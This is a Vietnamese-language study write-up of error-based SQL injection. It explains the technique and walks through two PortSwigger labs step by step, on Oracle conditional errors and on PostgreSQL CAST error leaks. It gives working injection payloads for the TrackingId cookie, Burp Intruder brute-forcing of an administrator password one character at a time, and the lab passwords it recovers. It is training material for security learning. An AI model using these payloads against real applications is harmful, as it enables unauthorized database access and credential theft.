# Error-based SQL injection

SQL injection dựa trên lỗi xảy ra khi có thể khai thác các thông báo lỗi của cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, ngay cả trong các tình huống **blind SQL injection** (blind SQLi). Mức độ khai thác phụ thuộc vào cách cấu hình cơ sở dữ liệu và các loại lỗi có thể kích hoạt:

**1. Khai thác phản hồi lỗi theo điều kiện boolean**

- Có thể khiến ứng dụng trả về một lỗi cụ thể dựa trên kết quả của một biểu thức điều kiện **boolean**.
- Kỹ thuật này hoạt động tương tự như việc khai thác **blind SQL injection** dựa trên **phản hồi có điều kiện**.

**2. Khai thác lỗi để trích xuất dữ liệu nhạy cảm**

- Một số lỗi có thể chứa dữ liệu từ truy vấn SQL.
- Điều này biến **blind SQL injection** (blind SQLi) thành một lỗi SQL injection có thể nhìn thấy (visible SQLi).

# Exploiting blind SQL injection by triggering conditional errors

Một số ứng dụng thực hiện các truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật trong phần trước sẽ không hoạt động vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt trong phản hồi của ứng dụng.

Thường có thể khiến ứng dụng trả về phản hồi khác nhau dựa trên việc xảy ra lỗi SQL. Có thể chỉnh sửa truy vấn để gây ra lỗi cơ sở dữ liệu chỉ khi điều kiện là đúng. Thông thường, một lỗi chưa được xử lý do cơ sở dữ liệu ném ra sẽ gây ra sự khác biệt trong phản hồi của ứng dụng, chẳng hạn như hiển thị thông báo lỗi. Điều này cho phép suy luận tính đúng/sai của điều kiện đã chèn.

# Exploiting blind SQL injection by triggering conditional errors - Continued

Để hiểu cách thức hoạt động của phương pháp này, giả sử có hai yêu cầu được gửi với các giá trị cookie TrackingId sau:

    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

Những truy vấn này sử dụng từ khóa **CASE** để kiểm tra một điều kiện và trả về một giá trị khác nhau tùy thuộc vào kết quả của điều kiện đó:

- Với đầu vào đầu tiên, biểu thức **CASE** được đánh giá là **'a'**, không gây ra lỗi nào.

- Với đầu vào thứ hai, biểu thức được đánh giá là **1/0**, gây ra lỗi chia cho 0.

Nếu lỗi này tạo ra sự khác biệt trong phản hồi HTTP của ứng dụng, có thể sử dụng nó để xác định xem điều kiện đã tiêm có đúng hay không.

**Trích xuất dữ liệu bằng phương pháp này**

Sử dụng kỹ thuật này, có thể trích xuất dữ liệu bằng cách kiểm tra từng ký tự một:

    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

**Lưu ý**: Có nhiều cách khác nhau để kích hoạt lỗi có điều kiện, và mỗi loại cơ sở dữ liệu có phương pháp khai thác tối ưu riêng.

# Lab: Blind SQL injection with conditional errors

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image128.png?raw=true)

Truy cập lab:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image129.png?raw=true)

Click vào category Tech gifts và intercept request này trong Burp Suite: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image130.png?raw=true)

=> Website sử dụng Tracking cookies để theo dõi hành vi người dùng.

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image131.png?raw=true)

Thử thêm dấu **'** vào sau giá trị TrackingId: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image132.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image133.png?raw=true)

=> Lỗi Internal Server Error. 

Thử thêm một dấu **'** nữa: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image134.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image135.png?raw=true)

=> Không còn lỗi. Điều này cho thấy rằng lỗi cú pháp (trong trường hợp này là dấu **'** chưa đóng) đang ảnh hưởng rõ ràng đến phản hồi.

Cần xác nhận rằng website đang xử lý payload chèn vào như một truy vấn SQL, tức là lỗi xuất hiện do cú pháp SQL chứ không phải do một loại lỗi khác. Thử chèn một truy vấn con với cú pháp SQL hợp lệ. **'||(SELECT '')||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image136.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image137.png?raw=true)

=> Lỗi Internal Server Error. Có thể là do loại CSDL - thử chỉ định tên bảng có thể dự đoán được trong truy vấn: **'||(SELECT '' FROM dual)||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image138.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image139.png?raw=true)

=> Không còn lỗi. Cho thấy webiste có thể đang sử dụng cơ sở dữ liệu Oracle, luôn yêu cầu tất cả các câu lệnh **SELECT** phải chỉ định rõ ràng tên bảng.

Sau khi gửi một truy vấn có vẻ hợp lệ, thử gửi một truy vấn không hợp lệ nhưng vẫn đảm bảo cú pháp SQL hợp lệ. Thử truy vấn một bảng không tồn tại, sử dụng payload **'||(SELECT '' FROM not-a-real-table)||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image140.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image141.png?raw=true)

Website tiếp tục trả về lỗi. Điều này cho thấy payload chèn vào đang được xử lý như một truy vấn SQL bởi hệ thống backend của website. 

Chỉ cần chèn các truy vấn SQL hợp lệ về mặt cú pháp, có thể sử dụng phản hồi lỗi từ website để suy luận thông tin quan trọng về cơ sở dữ liệu. Ví dụ, để xác minh rằng bảng **users** tồn tại, chèn payload **'||(SELECT '' FROM users WHERE ROWNUM = 1)||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image142.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image143.png?raw=true)

=> Truy vấn này không trả về lỗi, suy ra bảng **users** thực sự tồn tại. Điều kiện **WHERE ROWNUM = 1** rất quan trọng để ngăn truy vấn trả về nhiều hơn một dòng, điều này có thể gây lỗi trong quá trình nối chuỗi.

Tiếp theo thử chèn payload **'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'** để kiểm tra việc sử dụng điều kiện: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image144.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image145.png?raw=true)

=> Website trả về lỗi. Thử chèn payload **'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image146.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image147.png?raw=true)

=> Website không trả về lỗi. => Có thể kích hoạt một lỗi một cách có điều kiện dựa trên tính đúng sai của một điều kiện cụ thể.

Câu lệnh **CASE** kiểm tra một điều kiện và trả về một biểu thức nếu điều kiện đúng, và một biểu thức khác nếu điều kiện sai. Biểu thức đầu tiên chứa phép chia cho 0, gây ra lỗi. Trong trường hợp này, hai payload kiểm tra các điều kiện **1=1** và **1=2**, và một lỗi được trả về khi điều kiện đúng.

Có thể sử dụng hành vi này để kiểm tra xem các bản ghi cụ thể có tồn tại trong bảng hay không. Dùng truy vấn **'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'** để kiểm tra xem tên người dùng **administrator** có tồn tại hay không:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image148.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image149.png?raw=true)

=> Lỗi được trả về => điều kiện đúng, có người dùng tên **administrator**. 

Tiếp theo cần xác định độ dài mật khẩu của administrator, sử dụng payload **'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'**: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image150.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image151.png?raw=true)

=> Lỗi được trả về, điều kiện là đúng, độ dài password > 1. 

Chèn payload **'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'**:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image152.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image153.png?raw=true)

=> Không có lỗi, nghĩa là điều kiện sai => độ dài password = 20. 

Tiếp theo cần thử từng ký tự tương ứng với từng vị trí, send request sang Intruder và thay payload thành **'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'**: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image154.png?raw=true)

Chọn vị trí brute-force ở ký tự tương ứng với từng vị trí (='a') 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image155.png?raw=true)

Chọn payload: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image156.png?raw=true)

Start attack, lọc ra những lần thử trả về lỗi 500 vì đó sẽ là ký tự cần tìm:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image157.png?raw=true)

Tiếp tục thay lần lượt từng vị trí và tấn công lại: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image158.png?raw=true)

=> Tìm ra password: twqfdeu25oasvp136962 

Login tài khoản administrator: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image159.png?raw=true)

Solved the lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image160.png?raw=true)

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
twqfdeu25oasvp136962 

# Extracting sensitive data via verbose SQL error messages

Cấu hình sai của cơ sở dữ liệu đôi khi dẫn đến việc hiển thị **thông báo lỗi chi tiết** (verbose error messages). Những thông tin này có thể hữu ích cho kẻ tấn công. Ví dụ, xem xét thông báo lỗi sau, xuất hiện khi chèn một dấu nháy đơn **(')** vào **tham số id**:

    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

Thông báo này tiết lộ **toàn bộ truy vấn SQL** mà ứng dụng đã tạo từ đầu vào. Có thể thấy rằng đầu vào đang được chèn vào một chuỗi được bao bọc bởi dấu nháy đơn trong câu lệnh **WHERE**.

Thông tin này giúp kẻ tấn công dễ dàng hơn trong việc xây dựng một truy vấn hợp lệ chứa payload độc hại. Ví dụ, kẻ tấn công có thể sử dụng ký tự chú thích **(--)** để vô hiệu hóa phần còn lại của truy vấn, từ đó tránh lỗi cú pháp do dấu nháy đơn dư thừa gây ra.

# Extracting sensitive data via verbose SQL error messages - Continued

Đôi khi, kẻ tấn công có thể **khiến ứng dụng tạo ra một thông báo lỗi chứa dữ liệu được trả về từ truy vấn**. Điều này biến một lỗ hổng SQL injection dạng mù (blind SQL injection) thành có thể quan sát được (visible SQL injection).

Một cách để làm điều này là sử dụng hàm **CAST()**, cho phép chuyển đổi kiểu dữ liệu. Ví dụ, giả sử truy vấn chứa câu lệnh sau:

    CAST((SELECT example_column FROM example_table) AS int)

Thông thường, dữ liệu mà kẻ tấn công muốn đọc là **chuỗi ký tự** (string). Nếu cố gắng chuyển đổi chuỗi này sang một kiểu dữ liệu không tương thích, chẳng hạn như **số nguyên** (int), truy vấn có thể gây ra lỗi tương tự như sau:

    ERROR: invalid input syntax for type integer: "Example data"

Loại truy vấn này cũng có thể hữu ích nếu ứng dụng **giới hạn độ dài ký tự**, khiến kẻ tấn công không thể sử dụng các phương pháp như **phản hồi có điều kiện (conditional responses)** để khai thác SQL injection.

# Lab: Visible error-based SQL injection

![img](161)

Truy cập lab:

![img](162)

Chọn category Pets và intercept request trong Burp Suite: 

![img](163)

=> Website sử dụng Tracking cookie để theo dõi hành vi của người dùng. Thử thêm dấu **'** vào giá trị TrackingId: 

![img](164)

Send request và quan sát response: 

![img](165)

=> Website trả về thông báo lỗi *Unterminated string literal started at position 53 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' '. Expected  char*. 

Thử thêm **'--**:

![img](166)

Send request, quan sát response: 

![img](167)

=> Website không trả về lỗi. Thử chèn **' AND CAST((SELECT 1) AS int)--**: 

![img](168)

Send request, quan sát response: 

![img](169)

=> Website trả về lỗi *ERROR: argument of AND must be type boolean, not type integer Position: 63*

=> Điều kiện **AND** phải là biểu thức boolean. Thử chèn **' AND 1=CAST((SELECT 1) AS int)--**: 

![img](170)

Send request, quan sát response: 

![img](171)

=> Website không trả về lỗi => đây là 1 truy vấn hợp lệ. Chỉnh sửa truy vấn thành **' AND 1=CAST((SELECT username FROM users) AS int)--**:

![img](172)

Send request, quan sát response: 

![img](173)

=> Website trả về lỗi *Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' AND 1=CAST((SELECT username FROM users) AS'. Expected  char*

Nhận thấy truy vấn chèn đang bị rút gọn, có thể do giới hạn ký tự => không có phần chỉ định comment (--). Xóa giá trị TrackingId và gửi lại request: 

![img](174)

Send request, quan sát response: 

![img](175)

=> Website trả về lỗi *ERROR: more than one row returned by a subquery used as an expression*. 

=> Thông báo lỗi cho thấy truy vấn đã được chạy đúng, nhưng vẫn gặp lỗi vì nó trả lại nhiều hơn một hàng.

Chỉnh sửa lại truy vấn để nó chỉ trả về 1 hàng: **' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--**:

![img](176)

Send request, quan sát response: 

![img](177)

=> Website trả về thông báo lỗi *ERROR: invalid input syntax for type integer: "administrator"*

=> Thông báo lỗi tiết lộ tên người dùng đầu tiên từ bảng users là **administrator**.

Chỉnh sửa payload thành **' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--**: 

![img](178)

Send request, quan sát response: 

![img](179)

=> Tìm ra password của người dùng đầu tiên: l6pt2ypstrizz9jrjtmr

Login tài khoản administrator và solved bài lab: 

![img](180)





























